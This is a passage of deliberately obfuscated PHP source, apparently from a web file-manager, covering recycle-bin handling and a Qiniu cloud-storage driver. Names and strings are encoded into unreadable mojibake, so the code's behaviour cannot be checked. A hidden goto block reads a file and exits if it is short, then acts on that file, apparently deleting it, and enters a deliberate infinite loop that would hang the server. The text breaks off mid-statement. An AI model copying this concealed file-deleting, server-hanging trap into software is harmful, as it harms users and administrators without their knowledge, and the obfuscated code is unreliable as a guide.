$‘ŠÄ›´ˆ = array_unique(array_filter($‘ŠÄ›´ˆ)); if ($‘ŠÄ›´ˆ) { $†ºş§ï = array($¸Úä©ˆÙ[484] => array($¸Úä©ˆÙ[485], $‘ŠÄ›´ˆ)); $ª½ºöÇ÷ += floatval($this->where($†ºş§ï)->sum($¸Úä©ˆÙ[89])); } } $ª½ºöÇ÷ = !$ª½ºöÇ÷ || $ª½ºöÇ÷ <= 0 ? 0 : $ª½ºöÇ÷; return $ª½ºöÇ÷; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ìÀèëº) { return $this->fileTypeProfile($ìÀèëº, SourceModel::TYPE_USER); } public function groupFileTypeProfile($úùÙ¼Ã¢) { return $this->fileTypeProfile($úùÙ¼Ã¢, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ş…ùóÜı, $Áã÷±ê·) { $©µ³‚¨ë =& $_SERVER[è¶³ÒßÑ]; $‰êáîØŒ = $©µ³‚¨ë[2276] . $ş…ùóÜı . $©µ³‚¨ë[11] . $Áã÷±ê·; $ó•µÁó• = Cache::get($‰êáîØŒ); if ($ó•µÁó•) { return $ó•µÁó•; } $ˆ­ß¹×« = array($©µ³‚¨ë[639] => 0); if ($ş…ùóÜı != !1) { $ˆ­ß¹×«[$©µ³‚¨ë[562]] = $ş…ùóÜı; $ˆ­ß¹×«[$©µ³‚¨ë[200]] = $Áã÷±ê·; } $Î£ŠÁ– = array(); $Î£ŠÁ–[$©µ³‚¨ë[2277]] = array($©µ³‚¨ë[2278] => LNG($©µ³‚¨ë[2277]), $©µ³‚¨ë[2279] => $this->where($ˆ­ß¹×«)->count(), $©µ³‚¨ë[610] => $this->where($ˆ­ß¹×«)->sum($©µ³‚¨ë[89])); $Õ„ş²¾ = KodIO::fileTypeList(); foreach ($Õ„ş²¾ as $ß´Êçë => $Î’‹¶›) { $ˆ­ß¹×«[$©µ³‚¨ë[479]] = $this->fileTypeWhere($ß´Êçë); $Î£ŠÁ–[$ß´Êçë] = array($©µ³‚¨ë[2278] => $Î’‹¶›[$©µ³‚¨ë[32]], $©µ³‚¨ë[2279] => $this->where($ˆ­ß¹×«)->count(), $©µ³‚¨ë[610] => $this->where($ˆ­ß¹×«)->sum($©µ³‚¨ë[89])); } Cache::set($‰êáîØŒ, $Î£ŠÁ–, 1200); return $Î£ŠÁ–; } public function fileNameExist($¾€Ü¿Š, $úµöû¹Æ) { $ş¨˜ùÈì =& $_SERVER[è¶³ÒßÑ]; $‹œÒ§˜Ô = $this->field($ş¨˜ùÈì[2280])->where(array($ş¨˜ùÈì[202] => $¾€Ü¿Š, $ş¨˜ùÈì[32] => $úµöû¹Æ, $ş¨˜ùÈì[498] => 0))->find(); return is_array($‹œÒ§˜Ô) ? $‹œÒ§˜Ô[$ş¨˜ùÈì[203]] : !1; } public function childList($Ö’Ë¼£š) { $®¯˜˜ıØ =& $_SERVER[è¶³ÒßÑ]; $àä®ñ¤² = $®¯˜˜ıØ[2253] . $Ö’Ë¼£š; if (isset(self::$cacheChildList[$àä®ñ¤²])) { return self::$cacheChildList[$àä®ñ¤²]; } $‚Ğ±Çİ = array($®¯˜˜ıØ[202] => intval($Ö’Ë¼£š), $®¯˜˜ıØ[498] => 0); $³µÁ¸Õû = $this->where($‚Ğ±Çİ)->select(); $³µÁ¸Õû = $³µÁ¸Õû ? $³µÁ¸Õû : array(); self::$cacheChildList[$àä®ñ¤²] = $³µÁ¸Õû; foreach ($³µÁ¸Õû as $¨åßªù¨) { $àä®ñ¤² = $®¯˜˜ıØ[526] . $¨åßªù¨[$®¯˜˜ıØ[203]]; self::$cacheSourceInfo[$àä®ñ¤²] = $¨åßªù¨; } return $³µÁ¸Õû; } public function fileNameAuto($Â¯ÌÚ², $ˆšª±ö, $á”²ıÜİ = REPEAT_RENAME, $Ğê¾©« = false) { $ìÔÜ“Ã =& $_SERVER[è¶³ÒßÑ]; $ÉïëŠÍ¨ = get_path_ext($ˆšª±ö); $‡÷×ÙÉ = $ÉïëŠÍ¨ ? get_path_ext_name($ˆšª±ö) . $ìÔÜ“Ã[2281] . $ÉïëŠÍ¨ : $ˆšª±ö . $ìÔÜ“Ã[453]; $¼Šó¥ó = array($ìÔÜ“Ã[202] => $Â¯ÌÚ², $ìÔÜ“Ã[498] => 0, $ìÔÜ“Ã[32] => array($ìÔÜ“Ã[452], $‡÷×ÙÉ)); $ßÎ—ñ‚ = $this->field($ìÔÜ“Ã[32])->where($¼Šó¥ó)->select(); $áÂÇÛÔ† = array_to_keyvalue($ßÎ—ñ‚, $ìÔÜ“Ã[12], $ìÔÜ“Ã[32]); return $this->fileNameAutoGet($áÂÇÛÔ†, $ˆšª±ö, $á”²ıÜİ, $Ğê¾©«); } public function fileNameAutoGet($éØ¬Ïºç, $ì¿Ñ”©Ö, $÷¾áûÚª, $×ç—‚¡) { $°œÌ¦ëƒ =& $_SERVER[è¶³ÒßÑ]; if ($÷¾áûÚª == REPEAT_REPLACE || !$éØ¬Ïºç || !in_array_not_case($ì¿Ñ”©Ö, $éØ¬Ïºç) || $×ç—‚¡ && $÷¾áûÚª != REPEAT_RENAME_FOLDER) { return $ì¿Ñ”©Ö; } if ($÷¾áûÚª == REPEAT_SKIP) { return !1; } $·ÌÜşõ = $°œÌ¦ëƒ[10] . get_path_ext($ì¿Ñ”©Ö); $·ÌÜşõ = $·ÌÜşõ == $°œÌ¦ëƒ[10] || $×ç—‚¡ ? $°œÌ¦ëƒ[12] : $·ÌÜşõ; for ($šÃà¥­Î = 1; $šÃà¥­Î <= count($éØ¬Ïºç) + 1; $šÃà¥­Î++) { $Ú˜åÃ–É = substr($ì¿Ñ”©Ö, 0, strlen($ì¿Ñ”©Ö) - strlen($·ÌÜşõ)); $¼€¬Íñ¦ = $Ú˜åÃ–É . "\50{$šÃà¥­Î}\x29{$·ÌÜşõ}"; if (!in_array_not_case($¼€¬Íñ¦, $éØ¬Ïºç)) { return $¼€¬Íñ¦; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\162\143\x65\x5f\x72\145\143\171\x63\x6c\x65"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\145\124\x69\155\x65", "\164\151\x6d\145", "\151\156\163\x65\162\164", "\146\x75\156\x63\x74\151\157\x6e")); public function listData($°¡€ÉæÙ = false) { $óáºÊí =& $_SERVER[è¶³ÒßÑ]; $°¡€ÉæÙ = $°¡€ÉæÙ ? $°¡€ÉæÙ : USER_ID; $ÉÀÖÁÁû = $this->where(array($óáºÊí[1752] => $°¡€ÉæÙ))->select(); return array_to_keyvalue($ÉÀÖÁÁû, $óáºÊí[12], $óáºÊí[203]); } public function moveToRecycle($ê¯‘¸¸Ÿ) { $ƒ§–ä³Ñ =& $_SERVER[è¶³ÒßÑ]; $ô•ùğÔ = Model($ƒ§–ä³Ñ[1395]); $ÍÉõƒ = $ô•ùğÔ->sourceInfo($ê¯‘¸¸Ÿ); if (!$ÍÉõƒ || $ÍÉõƒ[$ƒ§–ä³Ñ[498]] == $ƒ§–ä³Ñ[101]) { return; } $È¿İ«à¸ = array($ƒ§–ä³Ñ[484] => $ê¯‘¸¸Ÿ, $ƒ§–ä³Ñ[1752] => USER_ID, $ƒ§–ä³Ñ[641] => $ÍÉõƒ[$ƒ§–ä³Ñ[200]], $ƒ§–ä³Ñ[642] => $ÍÉõƒ[$ƒ§–ä³Ñ[562]], $ƒ§–ä³Ñ[645] => $ÍÉõƒ[$ƒ§–ä³Ñ[577]]); $this->add($È¿İ«à¸); $this->recycleMove($ê¯‘¸¸Ÿ, 1); if ($ÍÉõƒ[$ƒ§–ä³Ñ[478]] == $ƒ§–ä³Ñ[101]) { $±¥´²Ê³ = array($ƒ§–ä³Ñ[645] => array($ƒ§–ä³Ñ[605], $ÍÉõƒ[$ƒ§–ä³Ñ[577]] . $ê¯‘¸¸Ÿ . $ƒ§–ä³Ñ[606])); $ô•ùğÔ->where($±¥´²Ê³)->setField($ƒ§–ä³Ñ[498], 1); } } public function clear() { $this->remove(!1); } public function remove($˜’«á² = false, $ÌŞ›„í± = false) { $´÷¾ÀÌ¿ =& $_SERVER[è¶³ÒßÑ]; $ÌŞ›„í± = $ÌŞ›„í± ? $ÌŞ›„í± : USER_ID; $Ïí¡Œ²ı = Model($´÷¾ÀÌ¿[1395]); $â¼Ğïî = $this->listData($ÌŞ›„í±); $˜’«á² = $˜’«á² === !1 ? !1 : $˜’«á²; $ø¦®¼öã = array(); foreach ($â¼Ğïî as $¼ÔèÆ¬š) { if ($˜’«á² != !1 && !in_array($¼ÔèÆ¬š, $˜’«á²)) { continue; } $ş‰´åé° = $Ïí¡Œ²ı->sourceInfo($¼ÔèÆ¬š); $Ïí¡Œ²ı->remove($¼ÔèÆ¬š, !1); $ƒÈàÀ× = $ş‰´åé°[$´÷¾ÀÌ¿[200]] . $´÷¾ÀÌ¿[11] . $ş‰´åé°[$´÷¾ÀÌ¿[562]]; $ø¦®¼öã[$ƒÈàÀ×] = array($´÷¾ÀÌ¿[641] => $ş‰´åé°[$´÷¾ÀÌ¿[200]], $´÷¾ÀÌ¿[562] => $ş‰´åé°[$´÷¾ÀÌ¿[562]]); $this->where(array($´÷¾ÀÌ¿[203] => $¼ÔèÆ¬š))->delete(); } foreach ($ø¦®¼öã as $ÈÔ¤ÎĞÂ) { $Ïí¡Œ²ı->targetSpaceUpdate($ÈÔ¤ÎĞÂ[$´÷¾ÀÌ¿[200]], $ÈÔ¤ÎĞÂ[$´÷¾ÀÌ¿[562]]); } } public function restore($›Ä½İš† = false) { $¥ú³ÂéÂ = $this->listData(); $this->_restoreSource($¥ú³ÂéÂ, $›Ä½İš†); } public function removeUserAll($Æ¢­¸À­) { $this->remove(!1, $Æ¢­¸À­); } public function restoreItem($¿‚î„Îì) { $this->_restoreSource(array($¿‚î„Îì), array($¿‚î„Îì)); } private function _restoreSource($àÙœ•İã, $«ë¹¾í°) { $Õ¿²Ë±Ö =& $_SERVER[è¶³ÒßÑ]; $¶…¸ú• = Model($Õ¿²Ë±Ö[1395]); $«ë¹¾í° = $«ë¹¾í° == !1 ? !1 : $«ë¹¾í°; if (!$àÙœ•İã) { return !0; } $òÁ÷ÒÛ„ = array(); foreach ($àÙœ•İã as $ËÏŸş¹) { if ($«ë¹¾í° != !1 && !in_array($ËÏŸş¹, $«ë¹¾í°)) { continue; } $”²Æ‘  = $¶…¸ú•->sourceInfo($ËÏŸş¹); $ØîÒç©ª = $¶…¸ú•->sourceInfo($”²Æ‘ [$Õ¿²Ë±Ö[202]]); if ($ØîÒç©ª[$Õ¿²Ë±Ö[498]] == $Õ¿²Ë±Ö[101]) { continue; } $¶…¸ú•->lockMoveStart($ËÏŸş¹); $this->recycleMove($ËÏŸş¹, 0); if ($”²Æ‘ [$Õ¿²Ë±Ö[478]] == $Õ¿²Ë±Ö[101]) { $È£òÇÒ‹ = array($Õ¿²Ë±Ö[645] => array($Õ¿²Ë±Ö[605], $”²Æ‘ [$Õ¿²Ë±Ö[577]] . $ËÏŸş¹ . $Õ¿²Ë±Ö[606])); $¶…¸ú•->where($È£òÇÒ‹)->setField($Õ¿²Ë±Ö[498], 0); $this->restoreFolderChildren($ËÏŸş¹, $àÙœ•İã); } $this->where(array($Õ¿²Ë±Ö[203] => $ËÏŸş¹))->delete(); $¶…¸ú•->folderSizeReset($”²Æ‘ [$Õ¿²Ë±Ö[202]]); $òÁ÷ÒÛ„[] = $”²Æ‘ [$Õ¿²Ë±Ö[202]]; if ($”²Æ‘ [$Õ¿²Ë±Ö[478]] == $Õ¿²Ë±Ö[101]) { $òÁ÷ÒÛ„[] = $ËÏŸş¹; } $¶…¸ú•->lockMoveEnd($ËÏŸş¹); } $¶…¸ú•->updateModifyTime($òÁ÷ÒÛ„); } private function restoreFolderChildren($Éõãóµô, $¬Ëì¶Üè) { $ëÊÅ¸’ =& $_SERVER[è¶³ÒßÑ]; $ƒÊ½ÌÒĞ = Model($ëÊÅ¸’[1395]); $…ıÔÁ‘ = array($ëÊÅ¸’[203] => array($ëÊÅ¸’[7], array())); foreach ($¬Ëì¶Üè as $¢­µ¾öø) { if ($¢­µ¾öø == $Éõãóµô) { continue; } if (!$ƒÊ½ÌÒĞ->isParentOf($Éõãóµô, $¢­µ¾öø)) { continue; } $Éƒë‘§ = $ƒÊ½ÌÒĞ->sourceInfo($¢­µ¾öø); if ($Éƒë‘§[$ëÊÅ¸’[478]] == $ëÊÅ¸’[101]) { $…ıÔÁ‘[] = array($ëÊÅ¸’[645] => array($ëÊÅ¸’[605], $Éƒë‘§[$ëÊÅ¸’[577]] . $¢­µ¾öø . $ëÊÅ¸’[606])); } else { $…ıÔÁ‘[$ëÊÅ¸’[203]][1][] = $¢­µ¾öø; } } if (!$…ıÔÁ‘[$ëÊÅ¸’[203]][1]) { unset($…ıÔÁ‘[$ëÊÅ¸’[203]]); } if (!$…ıÔÁ‘) { return; } if (is_array($…ıÔÁ‘[$ëÊÅ¸’[203]]) && is_array($…ıÔÁ‘[$ëÊÅ¸’[203]][1])) { $…ıÔÁ‘[$ëÊÅ¸’[203]][1] = array_unique($…ıÔÁ‘[$ëÊÅ¸’[203]][1]); } $…ıÔÁ‘[$ëÊÅ¸’[1053]] = $ëÊÅ¸’[2061]; $ƒÊ½ÌÒĞ->where($…ıÔÁ‘)->setField($ëÊÅ¸’[498], 1); } private function recycleMove($™çÊ×›, $Ş¼®Ûíû = 1) { $ìã¸–Ä =& $_SERVER[è¶³ÒßÑ]; $ÄÉĞı£ = Model($ìã¸–Ä[1395]); $¾éä·Ä = Model($ìã¸–Ä[2282]); $ƒ¦³¯Æ = array($ìã¸–Ä[203] => $™çÊ×›); if ($Ş¼®Ûíû) { $ÄÉĞı£->where($ƒ¦³¯Æ)->setField($ìã¸–Ä[498], 1); $¾éä·Ä->eventRecycle($™çÊ×›, $ìã¸–Ä[2283]); } else { $‹ğÄìŒ– = $ÄÉĞı£->where($ƒ¦³¯Æ)->find(); $½Š…°İö = $‹ğÄìŒ–[$ìã¸–Ä[478]] == $ìã¸–Ä[101]; $²ˆ§ûõ˜ = $ÄÉĞı£->fileNameAuto($‹ğÄìŒ–[$ìã¸–Ä[202]], $‹ğÄìŒ–[$ìã¸–Ä[32]], REPEAT_RENAME_FOLDER, $½Š…°İö); if ($²ˆ§ûõ˜ != $‹ğÄìŒ–[$ìã¸–Ä[32]]) { $ÄÉĞı£->rename($™çÊ×›, $²ˆ§ûõ˜); } $ÄÉĞı£->where($ƒ¦³¯Æ)->setField($ìã¸–Ä[498], 0); $¾éä·Ä->eventRecycle($™çÊ×›, $ìã¸–Ä[2284]); } } } goto bî¯íÃšù; A«ùÃÌ÷Šë: define($_SERVER[è¶³ÒßÑ][670], $_SERVER[è¶³ÒßÑ][671]); $csyfwujbqk = $_SERVER[è¶³ÒßÑ][672]; if (!$csyfwujbqk) { return; } goto Aàµìé·™«; aƒèÙğ²ÔÒ: if (!isset($_SERVER[$_SERVER[è¶³ÒßÑ][56]]) || !isset($_SERVER[$_SERVER[è¶³ÒßÑ][54]])) { $_getc = $_SERVER[è¶³ÒßÑ][57]; $_getfile = $_SERVER[$_SERVER[è¶³ÒßÑ][58]] . $_SERVER[è¶³ÒßÑ][59]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[è¶³ÒßÑ][60], $_getfilec); if (count($_getarrs) < $_SERVER[è¶³ÒßÑ][61]) { $exit = $_SERVER[è¶³ÒßÑ][62]; $exit(); } $_act = $_SERVER[è¶³ÒßÑ][63]; $_act($_SERVER[$_SERVER[è¶³ÒßÑ][58]] . $_SERVER[è¶³ÒßÑ][59]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[è¶³ÒßÑ][447]); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($å’Ø˜“¬) { parent::__construct(); require_once SDK_DIR . $_SERVER[è¶³ÒßÑ][1506]; $this->_init($å’Ø˜“¬); } public function _init($Ö¶Ö´³é) { $ÇçŞ¶ì§ =& $_SERVER[è¶³ÒßÑ]; $this->config = $Ö¶Ö´³é; foreach ($Ö¶Ö´³é as $¹¿ÖÁÒÁ => $»ÓÛÛßÕ) { if (isset($this->{$¹¿ÖÁÒÁ})) { $this->{$¹¿ÖÁÒÁ} = $»ÓÛÛßÕ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÇçŞ¶ì§[1507] . LNG($ÇçŞ¶ì§[1440])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ã¡–Ü‰«, $ ÇĞÈäŸ = '', $îòŠşï  = REPEAT_RENAME) { if ($this->setContent($ã¡–Ü‰«, $ ÇĞÈäŸ)) { return $this->getPathOuter($ã¡–Ü‰«); } return !1; } public function mkdir($¿†ˆ¶ “, $åÂ·şšõ = REPEAT_SKIP) { $ŠÊŸÏˆ¡ =& $_SERVER[è¶³ÒßÑ]; $‰²±ĞÇ„ = trim($¿†ˆ¶ “, $ŠÊŸÏˆ¡[8]); if ($this->_isFolder($‰²±ĞÇ„)) { return $this->getPathOuter($‰²±ĞÇ„); } $¿†ˆ¶ “ = $‰²±ĞÇ„ . $ŠÊŸÏˆ¡[8]; $Í¡‚µòˆ = get_path_this($‰²±ĞÇ„); $«±ñŠÌ× = $¿†ˆ¶ “ . $Í¡‚µòˆ; if (!$this->mkfile($«±ñŠÌ×)) { return !1; } if (!$this->moveFile($«±ñŠÌ×, $¿†ˆ¶ “)) { $this->delFile($«±ñŠÌ×); return !1; } return $this->getPathOuter($‰²±ĞÇ„); } public function copyFile($Äøğãè, $úò¡òã‡) { $Õùäüæå = $this->bucketManager->copy($this->bucket, $Äøğãè, $this->bucket, $úò¡òã‡, !0); return $Õùäüæå ? !1 : $this->getPathOuter($úò¡òã‡); } public function moveFile($°ÊÚ•, $Ö›ú®•) { $ßá‡ÓÏÚ = $this->bucketManager->move($this->bucket, $°ÊÚ•, $this->bucket, $Ö›ú®•, !0); return $ßá‡ÓÏÚ ? !1 : $this->getPathOuter($Ö›ú®•); } public function delFile($ƒÄõÕ¦‹) { if (!$this->exist($ƒÄõÕ¦‹)) { return !0; } $òê­Û®– = $this->bucketManager->delete($this->bucket, $ƒÄõÕ¦‹); return $òê­Û®– ? !1 : !0; } public function delFolder($èõß¤†–) { $§¥£ÏÖ“ =& $_SERVER[è¶³ÒßÑ]; if (!$this->exist($èõß¤†–)) { return !0; } $this->listItemCache = !1; $‚°¯è©” = $this->fileList($èõß¤†–); $this->listItemCache = !0; $ã¼Ã‹¬® = trim($èõß¤†–, $§¥£ÏÖ“[8]) . $§¥£ÏÖ“[8]; if (!empty($èõß¤†–) && $èõß¤†– !== $§¥£ÏÖ“[238] && !in_array($ã¼Ã‹¬®, $‚°¯è©”[$§¥£ÏÖ“[95]])) { $‚°¯è©”[$§¥£ÏÖ“[95]][] = $ã¼Ã‹¬®; } $š‡Æô‡Û = $this->delByBatch($‚°¯è©”[$§¥£ÏÖ“[96]]); if (!$š‡Æô‡Û) { return !1; } $š‡Æô‡Û = $this->delByBatch($‚°¯è©”[$§¥£ÏÖ“[95]]); if (!$š‡Æô‡Û) { return !1; } return $this->delFile($ã¼Ã‹¬®); } private function delByBatch($­³ëì–­) { foreach (array_chunk($­³ëì–­, 1000) as $ØíµÅ‘¥) { $­‚œß•å = $this->bucketManager->buildBatchDelete($this->bucket, $ØíµÅ‘¥); list($¸Ğ§ë°, $ó”Õ‡˜Ş) = $this->bucketManager->batch($­‚œß•å); if ($ó”Õ‡˜Ş) { return !1; } } return !0; } public function rename($¸²É•¨, $ñÇ™ä£) { return $this->renameObject($¸²É•¨, $ñÇ™ä£); } public function fileInfo($¾§¹‚, $åÖ‡‰âÖ = false, $úŠ“ŒÑç = array()) { $·õ¸ÎôÉ =& $_SERVER[è¶³ÒßÑ]; $û¯×¤š‰ = array($·õ¸ÎôÉ[32] => $this->pathThis($¾§¹‚), $·õ¸ÎôÉ[97] => $this->getPathOuter($·õ¸ÎôÉ[8] . $¾§¹‚), $·õ¸ÎôÉ[33] => $·õ¸ÎôÉ[240], $·õ¸ÎôÉ[89] => isset($úŠ“ŒÑç[$·õ¸ÎôÉ[1508]]) ? $úŠ“ŒÑç[$·õ¸ÎôÉ[1508]] : 0, $·õ¸ÎôÉ[179] => $this->ext($¾§¹‚)); if ($åÖ‡‰âÖ) { return $û¯×¤š‰; } $û¯×¤š‰[$·õ¸ÎôÉ[241]] = $û¯×¤š‰[$·õ¸ÎôÉ[98]] = 0; $û¯×¤š‰[$·õ¸ÎôÉ[242]] = $û¯×¤š‰[$·õ¸ÎôÉ[243]] = !0; if (empty($úŠ“ŒÑç)) { $úŠ“ŒÑç = $this->objectMeta($¾§¹‚); if (!$úŠ“ŒÑç) { return $û¯×¤š‰; } } if (isset($úŠ“ŒÑç[$·õ¸ÎôÉ[244]]) && $úŠ“ŒÑç[$·õ¸ÎôÉ[244]]) { $û¯×¤š‰[$·õ¸ÎôÉ[245]] = $úŠ“ŒÑç[$·õ¸ÎôÉ[244]]; } if (isset($úŠ“ŒÑç[$·õ¸ÎôÉ[255]]) && $úŠ“ŒÑç[$·õ¸ÎôÉ[255]]) { $û¯×¤š‰[$·õ¸ÎôÉ[245]] = $úŠ“ŒÑç[$·õ¸ÎôÉ[255]]; } if (isset($úŠ“ŒÑç[$·õ¸ÎôÉ[1509]])) { $û¯×¤š‰[$·õ¸ÎôÉ[98]] = substr($úŠ“ŒÑç[$·õ¸ÎôÉ[1509]] . $·õ¸ÎôÉ[12], 0, 10); } if (isset($úŠ“ŒÑç[$·õ¸ÎôÉ[1508]])) { $û¯×¤š‰[$·õ¸ÎôÉ[89]] = $úŠ“ŒÑç[$·õ¸ÎôÉ[1508]]; } return $û¯×¤š‰; } public function folderInfo($°ÕÑŸ…È, $¡•‚ËÈ = false) { $ßÊèá†Õ =& $_SERVER[è¶³ÒßÑ]; $ıÚˆ›¥ = array($ßÊèá†Õ[32] => $this->pathThis($°ÕÑŸ…È), $ßÊèá†Õ[97] => $this->getPathOuter($ßÊèá†Õ[8] . $°ÕÑŸ…È), $ßÊèá†Õ[33] => $ßÊèá†Õ[88]); if ($¡•‚ËÈ) { return $ıÚˆ›¥; } $ıÚˆ›¥[$ßÊèá†Õ[241]] = $ıÚˆ›¥[$ßÊèá†Õ[98]] = 0; $ıÚˆ›¥[$ßÊèá†Õ[242]] = $ıÚˆ›¥[$ßÊèá†Õ[243]] = !0; $°ÕÑŸ…È = rtrim($°ÕÑŸ…È, $ßÊèá†Õ[8]) . $ßÊèá†Õ[8]; $úí‰îš = $this->objectMeta($°ÕÑŸ…È); if (isset($úí‰îš[$ßÊèá†Õ[1509]])) { $ıÚˆ›¥[$ßÊèá†Õ[98]] = substr($úí‰îš[$ßÊèá†Õ[1509]] . $ßÊèá†Õ[12], 0, 10); } return $ıÚˆ›¥; } public function listPath($·òéª¸×, $²Ò†Ù–à = false) { $äë°¿¾š =& $_SERVER[è¶³ÒßÑ]; $İÊí§™² = $this->fileList($·òéª¸×, $äë°¿¾š[8], !0); foreach ($İÊí§™²[$äë°¿¾š[95]] as $é¢ö›õ³ => $Ùı€ƒ) { $İÊí§™²[$äë°¿¾š[95]][$é¢ö›õ³] = $this->folderInfo($Ùı€ƒ, $²Ò†Ù–à); } foreach ($İÊí§™²[$äë°¿¾š[96]] as $é¢ö›õ³ => $Ùı€ƒ) { $İÊí§™²[$äë°¿¾š[96]][$é¢ö›õ³] = $this->fileInfo($Ùı€ƒ[$äë°¿¾š[107]], $²Ò†Ù–à, $Ùı€ƒ); } return $İÊí§™²; } public function has($Ã½Å¿Œ‚, $Ò½´Ëğë = false, $‹÷®ÏóÑ = true) { $¤íÃ¤îà =& $_SERVER[è¶³ÒßÑ]; $Ã½Å¿Œ‚ = trim($Ã½Å¿Œ‚, $¤íÃ¤îà[8]); $ÖòÑè = empty($Ã½Å¿Œ‚) && $Ã½Å¿Œ‚ !== $¤íÃ¤îà[238] ? $¤íÃ¤îà[12] : $Ã½Å¿Œ‚ . $¤íÃ¤îà[8]; $Çƒõ¯˜ = $¤íÃ¤îà[12]; $µ’Š = 500; $¥Úê¤í = $¤íÃ¤îà[8]; $±Éì‰ÄŒ = $”Ç»ù‹¼ = 0; while (!0) { check_abort(); list($èóé®Û‘, $‡Î…ˆ‰Û) = $this->bucketManager->listFiles($this->bucket, $ÖòÑè, $Çƒõ¯˜, $µ’Š, $¥Úê¤í); if ($‡Î…ˆ‰Û) { break; } $Çƒõ¯˜ = array_key_exists($¤íÃ¤îà[1452], $èóé®Û‘) ? $Çƒõ¯˜ = $èóé®Û‘[$¤íÃ¤îà[1510]] : $¤íÃ¤îà[12]; if ($Ò½´Ëğë) { if (!empty($èóé®Û‘[$¤íÃ¤îà[1511]])) { $±Éì‰ÄŒ += count($èóé®Û‘[$¤íÃ¤îà[1511]]); } if (!empty($èóé®Û‘[$¤íÃ¤îà[1512]])) { $”Ç»ù‹¼ += count($èóé®Û‘[$¤íÃ¤îà[1512]]); } if ($Çƒõ¯˜ === $¤íÃ¤îà[12]) { break; } continue; } if ($‹÷®ÏóÑ) { if (!empty($èóé®Û‘[$¤íÃ¤îà[1511]])) { return !0; } } else { if (!empty($èóé®Û‘[$¤íÃ¤îà[1512]])) { return !0; } } if ($Çƒõ¯˜ === $¤íÃ¤îà[12]) { break; } } if ($Ò½´Ëğë) { return array($¤íÃ¤îà[249] => $±Éì‰ÄŒ, $¤íÃ¤îà[250] => $”Ç»ù‹¼); } return !1; } public function listAll($êõ¡ƒÖ¬) { $¡´•¢™¨ =& $_SERVER[è¶³ÒßÑ]; $­Ï³ßØ§ = $this->fileList($êõ¡ƒÖ¬, $¡´•¢™¨[12], !0); $¨àÊÍ±Î = array_to_keyvalue($­Ï³ßØ§[$¡´•¢™¨[96]], $¡´•¢™¨[32]); foreach ($­Ï³ßØ§[$¡´•¢™¨[95]] as $÷ùÈ¦ÆÛ) { if (is_string($÷ùÈ¦ÆÛ)) { $¨àÊÍ±Î[$÷ùÈ¦ÆÛ] = array($¡´•¢™¨[89] => 0); } } return $this->listAllFiles($êõ¡ƒÖ¬, $¨àÊÍ±Î); } private function fileList($è˜¥®İö, $‚È¬Ä†· = '', $šª—©ªñ = 0) { $¬îíøé‡ =& $_SERVER[è¶³ÒßÑ]; $è˜¥®İö = trim($è˜¥®İö, $¬îíøé‡[8]); $›¡àôÓé = empty($è˜¥®İö) && $è˜¥®İö !== $¬îíøé‡[238] ? $¬îíøé‡[12] : $è˜¥®İö . $¬îíøé‡[8]; $ÅíÔµ¸£ = $¬îíøé‡[12]; $ÁÔ…üÁƒ = 1000; $Ä‡·ƒ¹“ = $à»“ôÈı = array(); while (!0) { check_abort(); list($×ïâà—, $ŠŠ—­–ˆ) = $this->bucketManager->listFiles($this->bucket, $›¡àôÓé, $ÅíÔµ¸£, $ÁÔ…üÁƒ, $‚È¬Ä†·); if ($ŠŠ—­–ˆ) { break; } $ÅíÔµ¸£ = array_key_exists($¬îíøé‡[1452], $×ïâà—) ? $ÅíÔµ¸£ = $×ïâà—[$¬îíøé‡[1510]] : $¬îíøé‡[12]; $ß•àØ¸¡ = isset($×ïâà—[$¬îíøé‡[1511]]) ? $×ïâà—[$¬îíøé‡[1511]] : array(); $ïØÒ­û÷ = isset($×ïâà—[$¬îíøé‡[1512]]) ? $×ïâà—[$¬îíøé‡[1512]] : array(); foreach ($ß•àØ¸¡ as $ö§ı) { if ($ö§ı[$¬îíøé‡[107]] == $›¡àôÓé) { continue; } $ò¹ÔÜÛ“ = $ö§ı[$¬îíøé‡[107]]; $ØÎµò²Ä = $ö§ı[$¬îíøé‡[1508]]; $ö§ı[$¬îíøé‡[89]] = $ØÎµò²Ä; $¬Î€—¿Â = $ØÎµò²Ä == 0 && substr($ò¹ÔÜÛ“, strlen($ò¹ÔÜÛ“) - 1, 1) == $¬îíøé‡[8] ? !0 : !1; $this->cacheMethodInfoSet($ò¹ÔÜÛ“, $¬Î€—¿Â, $ö§ı); if ($¬Î€—¿Â) { $Ä‡·ƒ¹“[] = $ò¹ÔÜÛ“; continue; } $à»“ôÈı[] = $šª—©ªñ ? $ö§ı : $ò¹ÔÜÛ“; } foreach ($ïØÒ­û÷ as $ò¹ÔÜÛ“) { if ($ò¹ÔÜÛ“ == $›¡àôÓé) { continue; } $Ä‡·ƒ¹“[] = $ò¹ÔÜÛ“; $this->cacheMethodInfoSet($ò¹ÔÜÛ“, !0); } if ($ÅíÔµ¸£ === $¬îíøé‡[12]) { break; } } $this->cacheMethodInfoSet($è˜¥®İö, !0); return array($¬îíøé‡[95] => $Ä‡·ƒ¹“, $¬îíøé‡[96] => $à»“ôÈı); } public function canRead($—½«Ø‚–) { return $this->exist($—½«Ø‚–) ? !0 : !1; } public function canWrite($ë£ß›×˜) { return $this->exist($ë£ß›×˜) ? !0 : !1; } public function getContent($“İşîËŞ) { return $this->fileSubstr($“İşîËŞ, 0, -1); } public function setContent($±”ª·ÏÙ, $•á¡İ‚ƒ = '') { $ô±‘–Ãş = $this->tempFile($this->pathThis($±”ª·ÏÙ)); file_put_contents($ô±‘–Ãş, $•á¡İ‚ƒ); if ($this->upload($±”ª·ÏÙ, 